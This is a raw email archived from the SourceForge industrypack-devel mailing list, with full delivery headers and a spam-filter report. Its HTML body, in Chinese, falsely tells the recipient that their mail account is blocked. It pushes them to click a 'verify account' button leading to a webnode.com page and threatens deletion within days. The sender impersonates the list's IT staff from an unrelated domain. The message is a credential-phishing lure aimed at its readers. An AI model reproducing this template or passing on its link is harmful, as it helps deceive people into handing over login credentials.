Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 33FDD40CF38
	for <lists+industrypack-devel@lfdr.de>; Thu, 16 Sep 2021 00:07:44 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mQd4A-0004os-Lv
	for lists+industrypack-devel@lfdr.de; Wed, 15 Sep 2021 22:07:42 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 id 1mQd48-0004ol-Vq
 for industrypack-devel@lists.sourceforge.net; Wed, 15 Sep 2021 22:07:40 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=WTdUX6+aO/iswfM85E57I0e4LjYDuvFkd3ZxvF+DUtc=; b=XE3cdM3srzsIVBrWoR7pifnlFp
 eAlZ6tKUzuFDdn/w52ySg1xQ57G2kjHRVPcs1RQrLc9LWOZXHAJH92dXdlHmAOsK7xEmTQxWZe9VV
 DaKQnA59ZWGlcDZI4elQiMdhG/3se5WzVBY0Wsyz3qIOcD5W7S0rqmcr/eF2FhzZYAEs=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=WTdUX6+aO/iswfM85E57I0e4LjYDuvFkd3ZxvF+DUtc=; b=F
 sIpUcn5R+4H34UGJZ1rCU25dfeYas5zKP+Hg3aT2IsF7f5reLBp4qK0jHt8d7a7fm5zEGkSVGmhux
 L5SQlEwF001jJrrTmrGtlKEWBJIPN3+2yd/pGYW6w11pz68ZA8jIgGBAokC7FvoKaWdu4IbL0wrej
 zpgqdVLhI7BSrJS0=;
Received: from [178.128.87.210] (helo=bizcloud-valuevalves.com.tw)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.92.3)
 id 1mQd48-0002oF-4d
 for industrypack-devel@lists.sourceforge.net; Wed, 15 Sep 2021 22:07:40 +0000
Received: from 127.0.0.1 (bizcloud-valuevalves.com.tw [IPv6:::1])
 by bizcloud-valuevalves.com.tw (Postfix) with ESMTP id 34E711E7DE0
 for <industrypack-devel@lists.sourceforge.net>;
 Wed, 15 Sep 2021 21:31:59 +0000 (UTC)
From: lists.sourceforge.net-IT@bizcloud-valuevalves.com.tw
To: industrypack-devel@lists.sourceforge.net
Date: 15 Sep 2021 14:32:00 -0700
Message-ID: <20210915143159.4D5DAB7066F45643@from.header.has.no.domain>
MIME-Version: 1.0
X-Spam-Score: 4.8 (++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  您的帳戶已被暫時阻止和限制 industrypack-devel@lists.sourceforge.net
    您的帳戶已被暫時阻止和限制發送和接收電子郵件點擊下面的連結來
    修復帳戶。 驗證帳戶 
 
 Content analysis details:   (4.8 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: webnode.com]
  0.0 RCVD_IN_SORBS_DUL      RBL: SORBS: sent directly from dynamic IP
                             address
                             [178.128.87.210 listed in dnsbl.sorbs.net]
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [178.128.87.210 listed in wl.mailspike.net]
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
  1.4 TVD_SPACE_RATIO_MINFP  Space ratio (vertical text obfuscation?)
X-Headers-End: 1mQd48-0002oF-4d
Subject: [Industrypack-devel] =?utf-8?b?55S15a2Q6YKu5Lu26aqM6K+B?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5217988855933827626=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5217988855933827626==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18792"></HEAD>
<body>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
s: initial; text-decoration-style: initial; text-decoration-color: initial"=
>&nbsp; &nbsp;</P>
<table lang=3D"en" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica,=
 sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MIN-WIDTH: 348px; TEXT=
-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: norma=
l; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: n=
ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
ration-thickness: initial; text-decoration-style: initial; text-decoration-=
color: initial; font-variant-numeric: inherit;=20
font-variant-east-asian: inherit; font-stretch: inherit" cellspacing=3D"0" =
cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR align=3Dcenter>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px"><BR>
<table style=3D"MAX-WIDTH: 516px; MIN-WIDTH: 220px; PADDING-BOTTOM: 20px" c=
ellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; WIDTH: 8px; MARGIN: 0px" width=3D"8">&nbsp;</TD>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px">
<DIV style=3D"BORDER-TOP: rgb(218,220,224) thin solid; BORDER-RIGHT: rgb(21=
8,220,224) thin solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(218,220=
,224) thin solid; PADDING-BOTTOM: 40px; PADDING-TOP: 40px; PADDING-LEFT: 20=
px; MARGIN: 0px; BORDER-LEFT: rgb(218,220,224) thin solid; PADDING-RIGHT: 2=
0px; border-radius: 8px" align=3Dcenter>
<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "", Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: bas=
eline; BORDER-BOTTOM: rgb(218,220,224) thin solid; PADDING-BOTTOM: 24px; PA=
DDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 32px; PADDING-=
RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit'>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 24px; FONT-FAMILY: inherit=
; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
px; PADDING-BOTTOM: 10px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit"><BR>&#24=
744;&#30340;&#24115;&#25142;&#24050;&#34987;&#26283;&#26178;&#38459;&#27490=
;&#21644;&#38480;&#21046;</DIV>
<table style=3D"MARGIN-TOP: 8px" align=3D"center">
<TBODY>
<TR style=3D"LINE-HEIGHT: normal">
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px"><STRONG>industrypack-devel@lists.sourceforge.net</STRONG></T=
D></TR></TBODY></TABLE></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px">&#24744;&#30340;&#24115;&#25142;&#24050;&#34987;&#26283;&#26178;&#38459=
;&#27490;&#21644;&#38480;&#21046;&#30332;&#36865;&#21644;&#25509;&#25910;&#=
38651;&#23376;&#37109;&#20214;&#40670;&#25802;&#19979;&#38754;&#30340;&#368=
99;&#32080;&#20358;<WBR>
&#20462;&#24489;&#24115;&#25142;&#12290;
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 10px; PADDING-TOP: =
32px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH:=
 0px">
<A style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: "", Robot=
o, RobotoDraft, Helvetica, Arial, sans-serif; BORDER-RIGHT-WIDTH: 0px; VERT=
ICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; MIN-WIDTH: 90px; COLOR: rgb=
(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px;=
 MARGIN: 0px; DISPLAY: inline-block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px=
; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(65,132,243); font-stretch: i=
nherit; border-radius: 5px; text-decoration-line:=20
none' href=3D"http://dapo5.webnode.com/contact/" rel=3D"noopener noreferrer=
" target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dht=
tps://google.com&amp;source=3Dgmail&amp;ust=3D1631731554350000&amp;usg=3DAF=
QjCNEIC2bGweqbfQ4TR8ihpQE2jAFrAw">&#39511;&#35657;&#24115;&#25142;</A></DIV=
>
<P style=3D"MARGIN-BOTTOM: 1em; COLOR: red"><STRONG>&#27880;&#24847;&#65306=
;&#22914;&#26524;&#24744;&#19981;&#39511;&#35657;&#24744;&#30340;&#24115;&#=
25142;&#36039;&#35338;&#65292;&#23559;&#22312;&#24190;&#22825;&#20839;&#210=
34;&#38500;&#24115;&#25142;</STRONG></P></DIV></DIV></TD>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; WIDTH: 8px; MARGIN: 0px" width=3D"8">&nbsp;</TD></TR></TBODY></TABLE></TD=
></TR>
<TR style=3D"HEIGHT: 32px">
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px"><BR></TD></TR></TBODY></TABLE></BODY></HTML>


--===============5217988855933827626==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5217988855933827626==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5217988855933827626==--
